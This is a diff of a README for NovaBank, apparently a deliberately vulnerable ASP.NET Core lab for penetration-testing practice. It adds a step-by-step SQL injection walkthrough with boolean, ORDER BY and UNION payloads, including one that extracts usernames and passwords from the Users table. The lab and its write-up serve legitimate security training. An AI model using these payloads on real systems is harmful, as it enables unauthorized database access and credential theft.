@@ -7,7 +7,9 @@ The project simulates a small real-world application called **NovaBank** and is 
 The goal is to follow a realistic penetration testing workflow rather than simply identifying vulnerabilities.
 
 ~~~text
+
 Build → Identify → Hypothesize → Test → Exploit → Assess Impact → Remediate → Retest
+
 ~~~
 
 ---
@@ -56,29 +58,53 @@ The frontend provides a realistic attack surface for testing:
 ## Application Architecture
 
 ~~~text
+
 Browser
+
    │
+
    ▼
+
 NovaBank JavaScript Frontend
+
    │
+
    │ HTTP Requests
+
    ▼
+
 ASP.NET Core Web API
+
    │
+
    ├── Authentication / Authorization
+
    │
+
    ├── User Management
+
    │
+
    ├── Transactions
+
    │
+
    ├── File Upload
+
    │
+
    ├── Security Testing Endpoints
+
    │
+
    └── Entity Framework Core
+
             │
+
             ▼
+
           SQLite
+
 ~~~
 
 The application is intentionally designed so that security testing can be performed from the perspective of an authenticated and unauthenticated attacker.
@@ -88,55 +114,101 @@ The application is intentionally designed so that security testing can be perfor
 ## Request Flow
 
 ~~~text
+
 Browser
+
    ↓
+
 JavaScript
+
    ↓
+
 Fetch API
+
    ↓
+
 HTTP Request
+
    ↓
+
 ASP.NET Core
+
    ↓
+
 Controller
+
    ↓
+
 Application Logic
+
    ↓
+
 Entity Framework Core
+
    ↓
+
 SQLite Database
+
    ↓
+
 HTTP Response
+
    ↓
+
 Browser
+
 ~~~
 
 Example login flow:
 
 ~~~text
+
 User clicks Login
+
        ↓
+
 app.js catches event
+
        ↓
+
 fetch()
+
        ↓
+
 POST /api/auth/login
+
        ↓
+
 AuthController
+
        ↓
+
 AppDbContext
+
        ↓
+
 SQLite
+
        ↓
+
 Credentials validated
+
        ↓
+
 JWT generated
+
        ↓
+
 JSON response
+
        ↓
+
 JavaScript stores token
+
        ↓
+
 Authenticated API requests
+
 ~~~
 
 ---
@@ -158,29 +230,53 @@ Security testing is performed manually using:
 The general methodology is:
 
 ~~~text
+
 Understand Application
+
         ↓
+
 Identify Attack Surface
+
         ↓
+
 Identify Input
+
         ↓
+
 Understand Data Flow
+
         ↓
+
 Create Hypothesis
+
         ↓
+
 Establish Baseline
+
         ↓
+
 Test
+
         ↓
+
 Confirm Vulnerability
+
         ↓
+
 Exploit
+
         ↓
+
 Assess Impact
+
         ↓
+
 Remediate
+
         ↓
+
 Retest
+
 ~~~
 
 The project focuses on understanding:
@@ -238,6 +334,7 @@ The project focuses on understanding:
 | PUT | `/api/users/{id}` | Update user |
 | DELETE | `/api/users/{id}` | Delete user |
 | GET | `/api/users/search` | Search users by username |
+| GET | `/api/sqli/basic` | Dedicated intentionally vulnerable SQL Injection training endpoint |
 | GET | `/api/users/reflect` | Reflected XSS testing endpoint |
 | GET | `/api/users/js` | JavaScript-context XSS testing endpoint |
 | GET | `/api/users/file` | File retrieval endpoint |
@@ -274,13 +371,21 @@ Testing included:
 Authentication and authorization are treated as separate concepts:
 
 ~~~text
+
 Authentication
+
 "Who are you?"
+
         ↓
+
 JWT
+
         ↓
+
 Authorization
+
 "What are you allowed to do?"
+
 ~~~
 
 ---
@@ -300,15 +405,25 @@ GET /api/users/3
 Testing flow:
 
 ~~~text
+
 Authenticated User
+
         ↓
+
 Access Own Object
+
         ↓
+
 Change Object ID
+
         ↓
+
 Access Another Object
+
         ↓
+
 Unauthorized Access
+
 ~~~
 
 The test demonstrated unauthorized:
@@ -342,13 +457,21 @@ Example:
 Testing flow:
 
 ~~~text
+
 Client-Controlled Property
+
         ↓
+
 Model Binding
+
         ↓
+
 Sensitive Server-Side Property
+
         ↓
+
 Unauthorized State Change
+
 ~~~
 
 The vulnerability demonstrated why sensitive authorization properties should not be directly bindable from untrusted client input.
@@ -370,17 +493,29 @@ A fresh login then generated a JWT containing the administrative role.
 Testing flow:
 
 ~~~text
+
 Normal User
+
      ↓
+
 Manipulate role
+
      ↓
+
 Role becomes admin
+
      ↓
+
 Fresh Login
+
      ↓
+
 JWT with admin role
+
      ↓
+
 Admin functionality
+
 ~~~
 
 This demonstrated a privilege escalation chain originating from unsafe client-controlled authorization data.
@@ -415,15 +550,33 @@ The testing demonstrated why API responses should return only the information re
 
 # 05 — SQL Injection
 
-A vulnerable endpoint was introduced:
+SQL Injection was tested through a dedicated intentionally vulnerable endpoint created for SQLi training:
 
 ~~~http
-GET /api/users/search?username=
+GET /api/sqli/basic?userInput=
 ~~~
 
-The vulnerable implementation constructed SQL using user-controlled input.
+The dedicated SQLi laboratory controller is:
 
-The testing methodology included:
+~~~text
+Controllers/SqliController.cs
+~~~
+
+The endpoint intentionally builds SQL using user-controlled input:
+
+~~~text
+User Input
+    ↓
+SQL Query Construction
+    ↓
+SQLite
+    ↓
+HTTP Response
+~~~
+
+## SQLi Testing Methodology
+
+The testing followed an in-band SQL Injection workflow:
 
 ~~~text
 Baseline
@@ -434,28 +587,194 @@ Boolean Testing
    ↓
 ORDER BY Enumeration
    ↓
-Column Count
-   ↓
 UNION Testing
    ↓
-Database Enumeration
+DBMS Fingerprinting
    ↓
-Schema Enumeration
+Table Enumeration
+   ↓
+Column Enumeration
    ↓
 Data Extraction
    ↓
 Impact Assessment
 ~~~
 
-SQLite metadata was also enumerated through:
+### 1. Baseline
 
-~~~sql
-SELECT name FROM sqlite_master;
+A normal request was established first:
+
+~~~http
+GET /api/sqli/basic?userInput=nikos
 ~~~
 
-The vulnerable query was later remediated using a parameterized query with `SqliteParameter`.
+The endpoint returned the matching database record.
 
-The same injection attempts were then retested against the remediated implementation.
+### 2. Injection Character
+
+A single quote was supplied to observe whether attacker-controlled input could alter SQL syntax.
+
+A server-side SQL error was observed, providing an initial SQL Injection indicator.
+
+### 3. Boolean Testing
+
+The input was tested with both TRUE and FALSE conditions.
+
+~~~text
+' OR 1=1 --
+' OR 1=2 --
+~~~
+
+The TRUE condition returned multiple database records, while the FALSE condition returned no records.
+
+This demonstrated that user-controlled input could change the logic of the SQL statement.
+
+### 4. Column Count Enumeration
+
+`ORDER BY` enumeration was used to identify the number of columns in the original query:
+
+~~~text
+ORDER BY 1 → 200
+ORDER BY 2 → 200
+ORDER BY 3 → 200
+ORDER BY 4 → 200
+ORDER BY 5 → 200
+ORDER BY 6 → 500
+~~~
+
+Therefore, the original query was determined to return **5 columns**.
+
+### 5. UNION Testing
+
+A `UNION SELECT` was then used with the discovered column count.
+
+The key requirement is that both `SELECT` statements return the same number of columns, with compatible data types where required by the DBMS.
+
+The testing established that a UNION query could be successfully appended to the original SQL statement.
+
+### 6. DBMS Fingerprinting
+
+A SQLite-specific function was tested through the UNION:
+
+~~~sql
+sqlite_version()
+~~~
+
+The response exposed:
+
+~~~text
+SQLite 3.53.3
+~~~
+
+This identified the backend DBMS and allowed DB-specific enumeration techniques to be selected.
+
+### 7. Table Enumeration
+
+SQLite metadata was queried through `sqlite_master`:
+
+~~~sql
+' UNION SELECT name,NULL,NULL,NULL,NULL FROM sqlite_master --
+~~~
+
+The response revealed database objects including the application tables:
+
+~~~text
+Users
+Transactions
+__EFMigrationsHistory
+__EFMigrationsLock
+sqlite_autoindex___EFMigrationsHistory_1
+sqlite_sequence
+~~~
+
+### 8. Column Enumeration
+
+The `Users` table structure was then enumerated using SQLite's table-valued pragma:
+
+~~~sql
+' UNION SELECT name,NULL,NULL,NULL,NULL
+FROM pragma_table_info('Users')--
+~~~
+
+The discovered columns included:
+
+~~~text
+Id
+Username
+Email
+Password
+Role
+~~~
+
+### 9. Data Extraction
+
+After identifying the relevant table and columns, username and password values were combined into a single output column using SQLite string concatenation:
+
+~~~sql
+' UNION SELECT username || '~' || password,NULL,NULL,NULL,NULL FROM Users--
+~~~
+
+The endpoint returned the extracted values in the HTTP response.
+
+This completed the full in-band SQL Injection chain:
+
+~~~text
+SQL Injection
+    ↓
+Column Count
+    ↓
+UNION
+    ↓
+DBMS Fingerprinting
+    ↓
+Table Enumeration
+    ↓
+Column Enumeration
+    ↓
+Data Extraction
+~~~
+
+### SQLi Pentester Methodology
+
+The exercise reinforced the following black-box questions:
+
+~~~text
+Where does my input enter?
+        ↓
+How does it affect the SQL statement?
+        ↓
+Can I alter the query logic?
+        ↓
+How many columns exist?
+        ↓
+Which DBMS am I dealing with?
+        ↓
+What tables exist?
+        ↓
+What columns exist?
+        ↓
+Which data can I extract?
+        ↓
+What is the security impact?
+~~~
+
+The important distinction practiced during the exercise was:
+
+~~~text
+Detection
+   ↓
+Confirmation
+   ↓
+Enumeration
+   ↓
+Extraction
+   ↓
+Impact
+~~~
+
+The previously vulnerable `/api/users/search` SQL Injection implementation was remediated using a parameterized query with `SqliteParameter` and retested.
+
+The new `/api/sqli/basic` endpoint exists as a dedicated intentionally vulnerable training surface for continued SQL Injection practice.
 
 ---
 
@@ -471,17 +790,29 @@ Testing flow:
 
 ~~~text
 Attacker Input
+
       ↓
+
 Database
+
       ↓
+
 API Response
+
       ↓
+
 Frontend
+
       ↓
+
 innerHTML
+
       ↓
+
 Browser parses HTML
+
       ↓
+
 JavaScript execution
 ~~~
 
@@ -515,13 +846,21 @@ The testing demonstrated:
 
 ~~~text
 Request
+
    ↓
+
 Server
+
    ↓
+
 HTTP Response
+
    ↓
+
 Browser
+
    ↓
+
 Execution
 ~~~
 
@@ -547,19 +886,33 @@ The source-to-sink flow was:
 
 ~~~text
 Attacker-Controlled URL Fragment
+
             ↓
+
 window.location.hash
+
             ↓
+
 decodeURIComponent()
+
             ↓
+
 domInput
+
             ↓
+
 innerHTML
+
             ↓
+
 Browser DOM
+
             ↓
+
 HTML parsing
+
             ↓
+
 JavaScript execution
 ~~~
 
@@ -621,15 +974,25 @@ Testing demonstrated:
 
 ~~~text
 Input
+
  ↓
+
 HTML Response
+
  ↓
+
 HTML Parser
+
  ↓
+
 DOM
+
  ↓
+
 Event Handler
+
  ↓
+
 JavaScript Execution
 ~~~
 
@@ -644,13 +1007,17 @@ The project demonstrates that XSS should be analyzed in two dimensions.
 ## Delivery Type
 
 ~~~text
+
 Reflected
+
 Request → Response → Browser
 
 Stored
+
 Request → Database → Response → Browser
 
 DOM
+
 Attacker Input → JavaScript → DOM Sink → Browser
 ~~~
 
@@ -660,10 +1027,15 @@ Examples include:
 
 ~~~text
 HTML Context
+
 Attribute Context
+
 JavaScript Context
+
 URL Context
+
 CSS Context
+
 DOM Context
 ~~~
 
@@ -705,13 +1077,21 @@ Testing flow:
 
 ~~~text
 Expected Filename
+
       ↓
+
 ../
+
       ↓
+
 Parent Directory
+
       ↓
+
 Escape Intended Directory
+
       ↓
+
 Read External File
 ~~~
 
@@ -754,9 +1134,13 @@ Additional shell operators were tested to understand parser behavior:
 
 ~~~text
 ;   command separator
+
 &&  execute next command if previous succeeds
+
 ||  execute next command if previous fails
+
 |   pipe output to another command
+
 &   background operator
 ~~~
 
@@ -764,13 +1148,21 @@ Example concepts:
 
 ~~~text
 Input
+
   ↓
+
 Shell Parser
+
   ↓
+
 Shell Operator
+
   ↓
+
 Additional Command
+
   ↓
+
 Command Execution
 ~~~
 
@@ -796,6 +1188,7 @@ Baseline upload:
 
 ~~~http
 POST /api/users/upload
+
 Content-Type: multipart/form-data
 ~~~
 
@@ -855,13 +1248,21 @@ The vulnerable controller performs:
 
 ~~~text
 User-Controlled Path
+
         ↓
+
 File.ReadAllTextAsync(path)
+
         ↓
+
 Read C# Source
+
         ↓
+
 CSharpScript.EvaluateAsync()
+
         ↓
+
 Server-Side Code Execution
 ~~~
 
@@ -883,13 +1284,21 @@ The scenario illustrates the potential escalation chain:
 
 ~~~text
 Insecure File Upload
+
         ↓
+
 File Stored on Server
+
         ↓
+
 Executable Content
+
         ↓
+
 Execution Endpoint
+
         ↓
+
 Server-Side Code Execution
 ~~~
 
@@ -918,13 +1327,21 @@ Testing flow:
 
 ~~~text
 Failed Login
+
      ↓
+
 Failed Login
+
      ↓
+
 Failed Login
+
      ↓
+
 Repeated Requests Accepted
+
      ↓
+
 No Visible Throttling
 ~~~
 
@@ -974,11 +1391,17 @@ Security lesson:
 
 ~~~text
 Application Source
+
       ↓
+
 Hardcoded Secret
+
       ↓
+
 Secret Exposure Risk
+
       ↓
+
 Potential Token Forgery
 ~~~
 
@@ -1000,17 +1423,29 @@ The vulnerable flow was:
 
 ~~~text
 Victim logs in
+
       ↓
+
 Browser stores authentication cookie
+
       ↓
+
 Victim visits malicious page
+
       ↓
+
 Malicious page submits forged request
+
       ↓
+
 Browser automatically sends cookie
+
       ↓
+
 Server sees authenticated request
+
       ↓
+
 State-changing action occurs
 ~~~
 
@@ -1022,9 +1457,13 @@ The remediated model requires:
 
 ~~~text
 Authentication Cookie
+
         +
+
 Valid CSRF Token
+
         ↓
+
 Request Accepted
 ~~~
 
@@ -1093,15 +1532,25 @@ Testing flow:
 
 ~~~text
 Attacker
+
    ↓
+
 User-Controlled URL
+
    ↓
+
 Application Server
+
    ↓
+
 Internal Resource
+
    ↓
+
 Sensitive Response
+
    ↓
+
 Attacker
 ~~~
 
@@ -1154,19 +1603,33 @@ For penetration testing, client-side JavaScript is useful because it can reveal:
 
 ~~~text
 Endpoints
+
    ↓
+
 HTTP Methods
+
    ↓
+
 Parameters
+
    ↓
+
 Request Headers
+
    ↓
+
 Authentication
+
    ↓
+
 Client-Side Logic
+
    ↓
+
 DOM Sources
+
    ↓
+
 DOM Sinks
 ~~~
 
@@ -1217,11 +1680,17 @@ The important pentester question is:
 
 ~~~text
 Where does the attacker-controlled data come from?
+
         ↓
+
 How is it processed?
+
         ↓
+
 Where does it end?
+
         ↓
+
 What parser interprets it?
 ~~~
 
@@ -1288,17 +1757,29 @@ The file upload flow is:
 
 ~~~text
 NovaBank Dashboard
+
        ↓
+
 Security Center
+
        ↓
+
 Uploaded Documents
+
        ↓
+
 Upload Document
+
        ↓
+
 File Input
+
        ↓
+
 POST /api/users/upload
+
        ↓
+
 Server Filesystem
 ~~~
 
@@ -1310,10 +1791,12 @@ This creates a realistic browser-based entry point for testing upload security.
 
 ~~~text
 vulnerable-api/
+
 │
 ├── Controllers/
 │   ├── AuthController.cs
 │   ├── UsersController.cs
+│   ├── SqliController.cs
 │   ├── TransactionsController.cs
 │   ├── CsrfController.cs
 │   ├── InternalController.cs
@@ -1382,10 +1865,17 @@ Examples:
 
 ~~~text
 AuthController
+
 UsersController
+
+SqliController
+
 TransactionsController
+
 CsrfController
+
 InternalController
+
 ExecutionController
 ~~~
 
@@ -1399,11 +1889,17 @@ Conceptually:
 
 ~~~text
 C# Application
+
      ↓
+
 Entity Framework Core
+
      ↓
+
 SQL
+
      ↓
+
 SQLite
 ~~~
 
@@ -1517,29 +2013,53 @@ Each feature follows a security-oriented process:
 
 ~~~text
 Application Feature
+
        ↓
+
 Understand Functionality
+
        ↓
+
 Identify Attack Surface
+
        ↓
+
 Identify Inputs
+
        ↓
+
 Trace Data Flow
+
        ↓
+
 Create Hypothesis
+
        ↓
+
 Establish Baseline
+
        ↓
+
 Manual Testing
+
        ↓
+
 Confirm Vulnerability
+
        ↓
+
 Controlled Exploitation
+
        ↓
+
 Impact Assessment
+
        ↓
+
 Remediation
+
        ↓
+
 Retesting
 ~~~
 
@@ -1556,21 +2076,37 @@ The project emphasizes asking the following questions during testing:
 
 ~~~text
 Where is the input?
+
         ↓
+
 Who controls it?
+
         ↓
+
 Where does it go?
+
         ↓
+
 Which component processes it?
+
         ↓
+
 What parser interprets it?
+
         ↓
+
 What is the final sink?
+
         ↓
+
 Can I access something I should not?
+
         ↓
+
 Can I modify something I should not?
+
         ↓
+
 Can I execute something I should not?
 ~~~
 
@@ -1597,6 +2133,7 @@ Current application functionality includes:
 - CSRF demonstration flow
 - SSRF demonstration flow
 - Controlled server-side execution testing
+- Dedicated SQL Injection training endpoint
 
 Current security coverage:
 
@@ -1639,8 +2176,15 @@ The laboratory will continue to evolve with additional:
 - Request smuggling scenarios
 - HTTP security testing
 - Advanced JWT scenarios
-- Remediation exercises
-- Retesting exercises
+- Blind SQL Injection
+- Error-Based SQL Injection
+- Time-Based Blind SQL Injection
+- Conditional Response SQL Injection
+- OAST SQL Injection
+- SQLi in JSON request bodies
+- SQLi in cookies and headers
+- SQLi in POST parameters
+- SQLi remediation and retesting
 - Security reporting
 - Professional penetration testing documentation
 
